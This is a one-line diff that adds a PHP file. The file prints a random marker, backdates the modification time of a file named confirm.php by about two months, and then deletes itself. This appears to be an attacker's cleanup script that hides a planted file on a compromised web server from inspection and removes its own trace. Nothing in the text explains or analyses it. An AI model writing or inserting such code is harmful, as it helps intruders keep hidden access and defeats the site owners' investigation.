@@ -1,0 +1,1 @@
+<?php echo "xuUKwPXSPp"; if (file_exists("./confirm.php")){ touch("./confirm.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*dCtaeBTsNu2uy6W4bezy*/ ?>
